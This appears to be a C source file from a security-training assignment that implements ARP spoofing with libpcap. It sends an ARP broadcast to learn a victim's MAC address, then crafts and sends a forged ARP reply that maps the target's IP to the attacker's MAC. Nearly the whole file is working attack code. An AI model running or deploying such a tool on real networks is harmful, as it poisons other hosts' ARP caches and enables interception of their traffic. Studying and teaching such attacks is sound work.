/* We need to architect this project with 5-steps.
 *  1. Get my MAC address.
 *  2. Get my IP address. (x)
 *   - It's enough to set my ip '0.0.0.0', because we're using the same gateway.
 *  3. Get sender's MAC address by broadcasting packet using my MAC & IP and sender's IP.
 *   - Using 'ping command' like "ping 8.8.8.8 -c -5" or "ping <sender ip> -c -5" can be considered,
 *      but the application was stopped until the excution of that command was terminated.
 *  4. Refactorize that ARP packet using target's IP, attacker's MAC, sender's IP and MAC.
 *  5. Send it.
 *
 * Especially, through this assignment, I was able to compare the code of other mentors
 *  with mine and find out what is different between them.
 ****************************************************************************************/

#include <stdio.h>
#include "send_arp.h"

int main(int argc, char* argv[])
{
    // Usage eg. send_arp <interface> <sender ip> <target ip>
    if (argc != 4)
    {
        usage();
        return -1;
    }

    /************************** Open Handle *************************/
    char* dev = argv[1];
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
    if (handle == nullptr)
    {
        fprintf(stderr, "couldn't open device %s: %s\n", dev, errbuf);
        return -1;
    }

    /*************** Declear the ARP packet structure ***************/
    struct arp_packet ap;
    memset(&ap, 0, sizeof(ap));

    /*************************** Get My IP **************************/
    /*{
        // https://technote.kr/176 [TechNote.kr]
        struct ifreq ifr;
        char ipstr[40];
        int s;

        s = socket(AF_INET, SOCK_DGRAM, 0);
        strncpy(ifr.ifr_name, "ens33", IFNAMSIZ);

        if (ioctl(s, SIOCGIFADDR, &ifr) < 0)
        {
            printf("Error");
        }
        else
        {
            inet_ntop(AF_INET, ifr.ifr_addr.sa_data+2, ipstr, sizeof(struct sockaddr));

            memset(ap.sdr_ip, 0, sizeof(ap.sdr_ip));

            for(unsigned int i = 0, cnt = 0; i < strlen(ipstr); i++)
            {
                if(ipstr[i] == '.')
                {
                    cnt++;
                }
                else
                {
                    ap.sdr_ip[cnt] = ap.sdr_ip[cnt] * 10 + (ipstr[i] - '0');
                }
            }

        }
    }*/

    /******************** Set ARP-Request Packet ********************/
    {
        memset(ap.e.ether_dhost, 0xFF, sizeof(ap.e.ether_dhost));
        GetSvrMacAddress(ap.e.ether_shost);
        ap.e.ether_type = htons(ETHERTYPE_ARP);

        ap.a.ar_hrd = htons(ARPHRD_ETHER);
        ap.a.ar_pro = htons(ETHERTYPE_IP);
        ap.a.ar_hln = MAC_SIZE;
        ap.a.ar_pln = IP_SIZE;
        ap.a.ar_op  = htons(ARPOP_REQUEST);

        GetSvrMacAddress(ap.sdr_mac);               // my mac
//      memset(ap.sdr_ip, 0, sizeof(ap.sdr_ip));    // my ip
//      memset(ap.tgt_mac, 0, sizeof(ap.tgt_mac));  // sender's mac
        ip_from_str(ap.tgt_ip, argv[2]);            // sender's ip
    }    
    {
        printf("[ARP-Broadcasting Packet]\n");
        for(uint32_t i = 0; i < sizeof(ap); i++)
        {
            printf("%.2X ", ((const u_char*)&ap)[i]);
//          printf("%.2X ", *(const u_char*)(&ap + i)); -> We can use the expression like this.
            if(i % 16 == 15)
            {
                printf("\n");
            }
        }
        printf("\n\n");
    }

    /******************** Send ARP-Request Packet *******************/
    if(pcap_sendpacket(handle, (const u_char*)&ap, sizeof(ap)) != 0)
    {
        fprintf(stderr, "couldn't send the packet to %s\n", ap.tgt_ip);
        pcap_close(handle);
        return -1;
    }

    /*********************** Get Sender's MAC ***********************/
    {
        while(true)
        {
            struct pcap_pkthdr* header;
            const u_char* packet;
            int res = pcap_next_ex(handle, &header, &packet);
            if (res == 0) continue;
            if (res == -1 || res == -2) break;

            const u_char tmp_mac[6] = {0, };    // Sender's mac
            memcpy((void*)tmp_mac, packet, sizeof(tmp_mac));

            if( is_same_mac(tmp_mac, ap.sdr_mac) && is_reply_arp_packet(packet)
                    && is_same_ip(ap.tgt_ip, (u_char*)&packet[LIBNET_ETH_H + LIBNET_ARP_H + sizeof(ap.sdr_mac)]))
            {
                // Store sender's mac in Ethernet packet.
                memcpy((void*)ap.tgt_mac, &packet[LIBNET_ETH_H + LIBNET_ARP_H], sizeof(ap.sdr_mac));
                break;
            }
            //
        }
    }

    /********************** Print Address Info **********************/
    {
        printf("[Address Information]");

        printf("Sender's IP:\t");       printf("%s", argv[2]);  putchar('\n');
        printf("Sender's MAC:\t");      print_mac(ap.tgt_mac);  putchar('\n');
        printf("Target's IP:\t");       printf("%s", argv[3]);  putchar('\n');
        printf("Target's MAC:\t-");                             putchar('\n');
        printf("Attacker's IP:\t-");                            putchar('\n');
        printf("Attacker's MAC:\t");    print_mac(ap.sdr_mac);  putchar('\n');
    }

    /********************** Set Fake-ARP Packet *********************/
    {
        memcpy(ap.e.ether_dhost, ap.tgt_mac, sizeof(ap.e.ether_dhost)); // Store sender's mac
        ip_from_str(ap.sdr_ip, argv[3]);                                // Store target's ip
        ap.a.ar_op  = htons(ARPOP_REPLY);                               // Change the op-code
    }
    {
        printf("[Fake-ARP Packet]\n");
        for(uint32_t i = 0; i < sizeof(ap); i++)
        {
            printf("%.2X ", ((const u_char*)&ap)[i]);
//          printf("%.2X ", *(const u_char*)(&ap + i)); -> We can use the expression like this.
            if(i % 16 == 15)
            {
                printf("\n");
            }
        }
        printf("\n\n");
    }

    /********************* Send Fake-ARP Packet *********************/
    if(pcap_sendpacket(handle, (const u_char*)&ap, sizeof(ap)) != 0)
    {
        fprintf(stderr, "couldn't send the packet to %s\n", ap.sdr_ip);
        pcap_close(handle);
        return -1;
    }

    /******************** Close handle and return *******************/
    pcap_close(handle);
    return 0;
}
